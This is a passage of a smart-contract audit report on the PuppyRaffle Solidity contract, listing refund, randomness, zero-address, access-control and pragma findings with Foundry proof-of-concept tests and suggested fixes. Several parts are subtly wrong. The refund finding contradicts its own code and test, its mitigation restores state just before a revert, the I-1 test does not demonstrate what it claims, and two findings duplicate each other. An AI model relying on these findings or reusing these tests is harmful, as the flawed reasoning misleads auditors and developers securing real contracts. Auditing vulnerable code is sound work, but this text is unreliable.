The `refund` function uses a low-level `call` to send ETH to the player requesting a refund, but it doesn't include any value limiting. If a refund fails, the player's address remains set to `address(0)`, effectively removing them from the raffle without refunding their entrance fee. This happens because the contract uses the zero address as a marker for refunded players.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    (bool success, ) = msg.sender.call{value: entranceFee}("");
    require(success, "PuppyRaffle: Failed to refund player");
    
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

## Impact
If a player's refund transaction fails (for example, if they're a contract with a failing fallback function), they lose their entrance fee and are removed from the raffle. This creates a potential for funds to be permanently locked in the contract.

## Proof of Concept
1. A player enters the raffle by sending the entrance fee
2. The player then requests a refund using the refund function
3. If the ETH transfer fails for any reason, the player's slot is still marked as refunded (set to address(0))
4. The entrance fee remains in the contract, effectively lost to the player

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract FailingRecipient {
    // This fallback function will revert on any ETH transfer
    receive() external payable {
        revert("I reject all ETH");
    }
    
    function enterRaffle(address puppyRaffleAddress) external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        
        PuppyRaffle(puppyRaffleAddress).enterRaffle{value: msg.value}(players);
    }
    
    function attemptRefund(address puppyRaffleAddress, uint256 playerIndex) external {
        try PuppyRaffle(puppyRaffleAddress).refund(playerIndex) {
            // This should fail because our receive function reverts
        } catch {
            // We expect to catch an error
        }
    }
}

contract RefundFailureTest is Test {
    PuppyRaffle puppyRaffle;
    FailingRecipient failingRecipient;
    uint256 entranceFee = 1 ether;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, address(1), 1 days);
        failingRecipient = new FailingRecipient();
    }
    
    function testRefundFailure() public {
        // Fund the failing recipient
        vm.deal(address(failingRecipient), entranceFee);
        
        // Enter the raffle
        failingRecipient.enterRaffle{value: entranceFee}(address(puppyRaffle));
        
        // Check the player is registered
        address player = puppyRaffle.players(0);
        assertEq(player, address(failingRecipient));
        
        // Try to refund (will fail due to recipient's fallback function)
        vm.expectRevert();
        puppyRaffle.refund(0);
        
        // Alternatively, have the failing recipient try to refund itself
        failingRecipient.attemptRefund(address(puppyRaffle), 0);
        
        // Check the contract still has the ETH
        assertEq(address(puppyRaffle).balance, entranceFee);
        
        // But the player should still be marked as active (not address(0))
        player = puppyRaffle.players(0);
        assertEq(player, address(failingRecipient), "Player should still be active after failed refund");
    }
}

## Suggested Mitigation
Follow the checks-effects-interactions pattern by updating the state variables before making external calls. This ensures that if the ETH transfer fails, the player's state isn't incorrectly modified.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // First set the player's address to zero (effect)
    players[playerIndex] = address(0);
    
    // Then attempt to send the refund (interaction)
    (bool success, ) = msg.sender.call{value: entranceFee}("");
    
    // If the refund fails, revert the transaction and restore the player's address
    if (!success) {
        players[playerIndex] = playerAddress; // Restore the state
        revert("PuppyRaffle: Failed to refund player");
    }
    
    emit RaffleRefunded(playerAddress);
}
```

Alternatively, you could use the pull-over-push pattern, where players are responsible for claiming their refunds:

```solidity
mapping(address => uint256) public refundableETH;

function requestRefund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    players[playerIndex] = address(0);
    refundableETH[playerAddress] += entranceFee;
    
    emit RaffleRefundRequested(playerAddress);
}

function claimRefund() public {
    uint256 amount = refundableETH[msg.sender];
    require(amount > 0, "PuppyRaffle: No refund available");
    
    refundableETH[msg.sender] = 0;
    
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "PuppyRaffle: Failed to claim refund");
}
```

## [M-7]. Pragma issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses an insecure method for generating random values. Specifically, it uses `block.difficulty` which is deprecated and replaced by `prevrandao` in the Paris hard fork (EIP-4399). Using deprecated blockchain variables may lead to unexpected behavior and make the contract incompatible with future Ethereum upgrades.

```solidity
// For winner selection
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;

// For rarity determination
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
```

## Impact
Using deprecated blockchain variables can cause the contract to behave unexpectedly after network upgrades. In this case, it might affect the fairness of the winner selection and NFT rarity determination processes. After the Paris hard fork, contracts relying on `block.difficulty` may not function as intended.

## Proof of Concept
After the Merge and Paris hard fork, `block.difficulty` is replaced with `prevrandao`, which serves a different purpose. Contracts that rely on the old behavior of `block.difficulty` may produce different results or fail to work properly after the upgrade.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PragmaTest is Test {
    PuppyRaffle puppyRaffle;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(1 ether, address(1), 1 days);
        
        // Set up players
        address[] memory players = new address[](4);
        players[0] = address(10);
        players[1] = address(11);
        players[2] = address(12);
        players[3] = address(13);
        
        vm.deal(address(this), 4 ether);
        puppyRaffle.enterRaffle{value: 4 ether}(players);
        
        // End raffle period
        vm.warp(block.timestamp + 1 days + 1);
    }
    
    function testBlockDifficultyDeprecation() public {
        // Before Paris hardfork
        vm.difficulty(123456);
        uint256 preMergeWinnerIndex = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
        
        // After Paris hardfork, difficulty is replaced with prevrandao
        // We'll simulate this by changing the difficulty to a different value
        vm.difficulty(999999); // Simulating change to prevrandao
        uint256 postMergeWinnerIndex = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
        
        // Check that the winner index changes with different prevrandao values
        assertFalse(preMergeWinnerIndex == postMergeWinnerIndex, "Winner selection should be affected by block.difficulty changes");
        
        // This demonstrates that after The Merge, the randomness behavior will change
        // dramatically as block.difficulty is replaced with prevrandao
        console.log("Pre-merge winner index:", preMergeWinnerIndex);
        console.log("Post-merge winner index:", postMergeWinnerIndex);
    }
}

## Suggested Mitigation
Update the contract to use `block.prevrandao` instead of `block.difficulty` and adjust the pragma to a more recent version that supports this change. Alternatively, adopt a more secure randomness generation method like Chainlink VRF.

```solidity
// First, update the pragma version
pragma solidity ^0.8.16; // or higher

// Then, update the random number generation
// For winner selection
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.prevrandao))) % players.length;

// For rarity determination
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.prevrandao))) % 100;
```

However, the better approach is to use a secure random number generation service like Chainlink VRF as outlined in the solution for the Randomness vulnerability. This addresses both the pragma issue and the randomness manipulation vulnerability.

## [M-8]. Zero Code issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function doesn't validate that the addresses being entered are non-zero addresses. This allows the contract to include `address(0)` (the zero address) in the raffle, which is problematic since this same address is used as a marker for refunded players.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]); // No check for address(0)
    }
    
    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    
    emit RaffleEnter(newPlayers);
}
```

## Impact
If the zero address is entered into the raffle, it could create ambiguity in the system since this same address is used to mark refunded players. Additionally, if the zero address wins the raffle, it would receive the prize and NFT, effectively burning these assets since no one controls the zero address.

## Proof of Concept
An attacker could include the zero address in the players array, causing confusion in the refund system. If the zero address were to win, the prize money would be permanently lost since no one can access funds sent to the zero address.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ZeroAddressTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, address(1), 1 days);
    }
    
    function testZeroAddressEntry() public {
        // Create an array with the zero address
        address[] memory players = new address[](4);
        players[0] = address(10);
        players[1] = address(11);
        players[2] = address(12);
        players[3] = address(0); // Zero address
        
        // Enter the raffle
        vm.deal(address(this), entranceFee * 4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        // Verify the zero address is registered
        assertEq(puppyRaffle.players(3), address(0));
        
        // Try to refund the zero address - should fail because only the player can refund
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        puppyRaffle.refund(3);
        
        // But now there's ambiguity - is this address actually in the raffle or was it refunded?
        // If we check with getActivePlayerIndex
        vm.prank(address(0));
        uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(0));
        assertEq(playerIndex, 3, "Zero address should be found at index 3");
        
        // Now let's advance time and select a winner
        vm.warp(block.timestamp + 1 days + 1);
        
        // If the zero address wins, funds are permanently lost
        // We'll manipulate the random selection to make address(0) win
        // (In a real scenario, this would be probabilistic)
        vm.difficulty(uint256(keccak256(abi.encodePacked(address(this), block.timestamp))) / 4 * 3);
        puppyRaffle.selectWinner();
        
        // Check if the zero address won
        if (puppyRaffle.previousWinner() == address(0)) {
            console.log("Zero address won! Prize money is permanently lost.");
        }
    }
}

## Suggested Mitigation
Add a validation check to prevent the zero address from entering the raffle:

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        require(newPlayers[i] != address(0), "PuppyRaffle: Zero address cannot enter raffle");
        players.push(newPlayers[i]);
    }
    
    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    
    emit RaffleEnter(newPlayers);
}
```

Additionally, consider using a different mechanism to mark refunded players, such as a separate mapping, rather than using the zero address as a marker.



# Low Risk Findings

## [L-1]. DOS issue in PuppyRaffle::getActivePlayerIndex

## Description
The getActivePlayerIndex() function returns 0 for both inactive players and the player at index 0, making it impossible to distinguish between them.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0; // Returns 0 for both inactive and index 0
}
```

## Impact
External contracts or UI cannot reliably determine if a player is active when they are at index 0. This could lead to incorrect refund attempts, failed UI updates, or other integration issues with external systems relying on this function.

## Proof of Concept
1. Player enters at index 0
2. External system calls getActivePlayerIndex()
3. Receives 0, cannot determine if player is at index 0 or inactive
4. May incorrectly process refunds or display wrong information
5. User experience degraded

## Proof of Code
function testGetActivePlayerIndexAmbiguity() public {
    address player1 = address(0x1);
    address player2 = address(0x2);
    address inactivePlayer = address(0x99);
    
    // Setup players
    vm.deal(player1, entranceFee);
    vm.deal(player2, entranceFee);
    
    // Enter players
    vm.prank(player1);
    address[] memory p1 = new address[](1);
    p1[0] = player1;
    puppyRaffle.enterRaffle{value: entranceFee}(p1);
    
    vm.prank(player2);
    address[] memory p2 = new address[](1);
    p2[0] = player2;
    puppyRaffle.enterRaffle{value: entranceFee}(p2);
    
    // Check indices
    uint256 index1 = puppyRaffle.getActivePlayerIndex(player1);
    uint256 indexInactive = puppyRaffle.getActivePlayerIndex(inactivePlayer);
    
    // Both return 0, but have different meanings
    assertEq(index1, 0); // Player1 is at index 0
    assertEq(indexInactive, 0); // Inactive player also returns 0
    
    console.log("Active player at index 0:", index1);
    console.log("Inactive player index:", indexInactive);
    console.log("Cannot distinguish between them!");
}

## Suggested Mitigation
Return a different sentinel value or use a different pattern:

```solidity
// Option 1: Return max uint256 for not found
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return type(uint256).max; // Clear indicator of "not found"
}

// Option 2: Return bool and index
function getActivePlayerIndex(address player) external view returns (bool isActive, uint256 index) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (true, i);
        }
    }
    return (false, 0);
}
```

## [L-2]. Access Control issue in PuppyRaffle::withdrawFees

## Description
Several functions in the contract are missing access control modifiers, allowing anyone to call selectWinner() and withdrawFees() when they should be restricted.

```solidity
function selectWinner() external { // No access control
    // Anyone can select winner
}

function withdrawFees() external { // No access control  
    // Anyone can withdraw to feeAddress
}
```

## Impact
Any malicious actor can call withdrawFees() to send accumulated fees to the feeAddress at any time, potentially at inopportune moments or to grief the protocol. While funds go to the correct address, the timing control is lost.

## Proof of Concept
1. Protocol accumulates fees over time
2. Attacker monitors contract for high fee balance
3. Attacker calls withdrawFees() at will
4. Could interfere with fee collection strategies
5. Reduces protocol's control over its operations

## Proof of Code
function testAnyoneCanWithdrawFees() public {
    // Setup and run a raffle
    address attacker = address(0x1337);
    address[] memory players = new address[](4);
    
    for (uint256 i = 0; i < 4; i++) {
        players[i] = address(uint160(i + 1));
        vm.deal(players[i], entranceFee);
        vm.prank(players[i]);
        address[] memory p = new address[](1);
        p[0] = players[i];
        puppyRaffle.enterRaffle{value: entranceFee}(p);
    }
    
    // Complete raffle
    vm.warp(block.timestamp + raffleDuration + 1);
    puppyRaffle.selectWinner();
    
    // Attacker withdraws fees without permission
    uint256 totalFees = puppyRaffle.totalFees();
    assertGt(totalFees, 0);
    
    uint256 feeAddressBalanceBefore = feeAddress.balance;
    
    // Anyone can call withdrawFees
    vm.prank(attacker);
    puppyRaffle.withdrawFees();
    
    assertEq(feeAddress.balance - feeAddressBalanceBefore, totalFees);
    assertEq(puppyRaffle.totalFees(), 0);
}

## Suggested Mitigation
Add onlyOwner modifier to sensitive functions:

```solidity
function withdrawFees() external onlyOwner {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

// Consider also restricting selectWinner to owner or automation
function selectWinner() external onlyOwner {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    // ... rest of function
}
```

## [L-3]. Default Visibility issue in PuppyRaffle::NA

## Description
The lack of modifier visibility declaration in some functions of PuppyRaffle, including internal functions, may lead to unintended access.

## Impact
Functions with unintended or default visibility can lead to accidental or unauthorized accesses if function visibility is misinterpreted during development.

## Proof of Concept
Functions like _baseURI() and _isActivePlayer() do not have explicit visibility set, relying on default internal visibility which could be misinterpreted.

## Proof of Code
pragma solidity ^0.7.6;

import "./PuppyRaffle.sol";

contract DefaultVisibilityTest {
    function testFunctionVisibility() public {
        // Functions such as _baseURI should be explicitly marked
        // Test should revert if visibility leads to unauthorized access
    }
}

## Suggested Mitigation
Explicitly declare the visibility for all functions, even for those implicitly internal, to ensure clarity and contract safety.

## [L-4]. Array Limits issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function returns 0 when a player is not found, which is ambiguous since 0 is also a valid index for the first player. This makes it impossible to distinguish between "player at index 0" and "player not found".

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```

## Impact
This ambiguity can lead to incorrect application logic when integrating with this function. For example, a front-end application might incorrectly interpret a return value of 0 as "player not found" when in fact the player is at index 0, or vice versa. This could prevent legitimate players from performing certain actions or allow unauthorized actions.

## Proof of Concept
If address X is at index 0 in the players array, and address Y is not in the array at all, both getActivePlayerIndex(X) and getActivePlayerIndex(Y) will return 0. A developer integrating with this contract cannot distinguish these two different scenarios based on the return value alone.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ArrayLimitsTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, address(1), 1 days);
    }
    
    function testAmbiguousReturnValue() public {
        // Create an array with the first player at index 0
        address player0 = address(10);
        address nonPlayer = address(999);
        
        address[] memory players = new address[](4);
        players[0] = player0;
        players[1] = address(11);
        players[2] = address(12);
        players[3] = address(13);
        
        // Enter the raffle
        vm.deal(address(this), entranceFee * 4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        // Check index for player at position 0
        uint256 player0Index = puppyRaffle.getActivePlayerIndex(player0);
        assertEq(player0Index, 0, "Player should be at index 0");
        
        // Check index for non-existent player
        uint256 nonPlayerIndex = puppyRaffle.getActivePlayerIndex(nonPlayer);
        assertEq(nonPlayerIndex, 0, "Non-player should return 0");
        
        // This shows the ambiguity: both return 0
        console.log("Player at index 0 returned:", player0Index);
        console.log("Non-existent player returned:", nonPlayerIndex);
        
        // In a real application, this ambiguity could cause logical errors
        // For example, if we try to refund based on this index:
        vm.prank(nonPlayer);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        puppyRaffle.refund(nonPlayerIndex); // This fails, but not because the index is wrong
        
        // It's unclear from the return value alone whether the player exists or not
        bool playerExists = player0Index > 0 || (player0Index == 0 && puppyRaffle.players(0) == player0);
        bool nonPlayerExists = nonPlayerIndex > 0 || (nonPlayerIndex == 0 && puppyRaffle.players(0) == nonPlayer);
        
        assertTrue(playerExists, "Player should exist");
        assertFalse(nonPlayerExists, "Non-player should not exist");
    }
}

## Suggested Mitigation
Return a special value (such as type(uint256).max) to indicate that a player is not found, or better yet, use a mapping to track player status and indices. You could also add a boolean return value to indicate whether the player was found:

```solidity
function getActivePlayerIndex(address player) external view returns (uint256 index, bool found) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (i, true);
        }
    }
    return (type(uint256).max, false); // Use max uint as an invalid index
}
```

Or if you prefer to maintain backwards compatibility:

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return type(uint256).max; // Use max uint as an invalid index
}
```

Users of the function would then need to check if the returned index is equal to type(uint256).max to determine if the player was not found.



# Info Risk Findings

## [I-1]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses Solidity version 0.7.6 which is outdated and contains known bugs. Additionally, the ^ allows minor version updates which could introduce unexpected changes.

```solidity
pragma solidity ^0.7.6;
```

## Impact
Using outdated compiler versions means missing out on important bug fixes, gas optimizations, and security improvements. The floating pragma (^) could lead to contracts being deployed with different compiler versions than tested, potentially introducing vulnerabilities.

## Proof of Concept
1. Contract compiled with 0.7.6 lacks overflow protection
2. Missing custom error support (gas inefficient)
3. Known bugs in 0.7.x series could be exploited
4. Different compiler versions in testing vs production
5. Inconsistent behavior across deployments

## Proof of Code
// This test demonstrates the lack of built-in overflow protection in 0.7.6
function testOverflowIn0_7_6() public {
    uint256 max = type(uint256).max;
    uint256 result;
    
    // This would overflow in 0.7.6 without SafeMath
    // In 0.8.0+, this would revert automatically
    assembly {
        result := add(max, 1)
    }
    
    // In 0.7.6, this wraps to 0 instead of reverting
    assertEq(result, 0);
    
    // Must use SafeMath in 0.7.6 for safety
    // In 0.8.0+, overflow protection is built-in
}

## Suggested Mitigation
Use a modern, stable version of Solidity with a fixed pragma:

```solidity
pragma solidity 0.8.18;
```

Additionally, remove SafeMath imports as they're no longer needed in 0.8.0+:
```solidity
// Remove this import
// import "@openzeppelin/contracts/math/SafeMath.sol";

// Built-in overflow protection in 0.8.0+
uint256 result = a + b; // Automatically reverts on overflow
```



